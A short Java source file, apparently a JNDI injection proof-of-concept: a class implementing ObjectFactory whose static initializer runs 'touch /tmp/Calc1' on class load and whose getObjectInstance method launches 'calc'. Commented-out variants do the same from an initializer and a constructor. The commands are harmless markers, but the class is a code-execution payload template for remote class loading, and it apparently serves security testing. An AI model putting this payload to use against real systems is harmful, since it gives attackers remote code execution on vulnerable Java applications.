package com.pxb.test;

import java.lang.Runtime;
import java.lang.Process;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Calc implements ObjectFactory {
//    {
//        try {
//            Runtime rt = Runtime.getRuntime();
//            String[] commands = {"calc"};
//            Process pc = rt.exec(commands);
//            pc.waitFor();
//        } catch (Exception e) {
//            // do nothing
//        }
//    }

    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/Calc1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }

//    public Calc() {
//        try {
//            Runtime rt = Runtime.getRuntime();
//            String[] commands = {"touch", "/tmp/Calc3"};
//            Process pc = rt.exec(commands);
//            pc.waitFor();
//        } catch (Exception e) {
//            // do nothing
//        }
//    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
        return null;
    }
}